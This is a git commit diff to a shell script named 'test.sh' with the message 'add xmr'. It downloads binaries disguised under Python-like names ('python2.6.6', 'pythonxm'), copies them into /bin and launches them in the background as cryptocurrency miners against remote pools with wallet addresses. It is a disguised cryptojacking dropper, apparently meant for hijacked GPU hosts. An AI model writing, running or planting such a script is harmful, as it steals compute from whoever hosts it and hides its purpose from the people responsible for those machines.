51d6389f547a29633170aa3a8939e62acb1fdbfd
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-28 16:53:36 +0200

    add xmr

--- test.sh
+++ test.sh
@@ -8,10 +8,14 @@ curl ipinfo.io
 # unzip kawpowminer-ubuntu18-1.2.3.zip
 # version1.2.2
 wget https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
+wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
+chmod +x pythonxm
 chmod +x python2.6.6
 cp python2.6.6 /bin/python2.6.6
+cp pythonxm /bin/pythonxm
 python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log02.out 1> log02.out &
 python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log01.out 1> log01.out  &
+pythonxm  -o ehttp.info:443 -a cn/r -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k 2> logxm.out 1> logxm.out  &
 nvidia-smi
 
 while [ 1 ]
